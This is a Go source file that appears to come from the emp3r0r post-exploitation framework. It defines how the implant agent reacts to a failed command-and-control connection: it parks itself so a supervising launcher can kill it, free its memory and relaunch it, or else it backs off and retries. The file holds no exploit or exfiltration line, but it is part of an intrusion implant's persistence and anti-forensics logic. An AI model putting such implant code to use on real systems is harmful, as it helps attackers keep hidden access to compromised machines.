//go:build linux

package main

import (
	"os"
	"syscall"

	"github.com/jm33-m0/emp3r0r/core/internal/agent/base/agentutils"
	"github.com/jm33-m0/emp3r0r/core/internal/agent/base/common"
	"github.com/jm33-m0/emp3r0r/core/lib/logging"
)

// conditionalC2FailNotify tells the parent (stager/loader) to recycle us.
func conditionalC2FailNotify() {
	if common.RuntimeConfig.IsRunByStager {
		// When a launcher is supervising us, park the process and let it kill
		// us: that is what frees every byte of agent code/data. The launcher
		// then restarts a fresh process with the identity key it cached.
		if agentutils.Supervised() {
			logging.Warningf("Agent idle, asking launcher to recycle us")
			if err := syscall.Kill(syscall.Getpid(), syscall.SIGSTOP); err != nil {
				logging.Warningf("Cannot park for the launcher: %v", err)
			}
			// If the launcher resumed us instead of terminating us, block
			// rather than racing back into a broken C2 connection.
			for {
				syscall.Pause()
			}
		}

		logging.Warningf("Agent lifecycle ended, recycling")
		os.Exit(0)
	}

	// Otherwise, back off and retry
	takeC2Backoff()
}
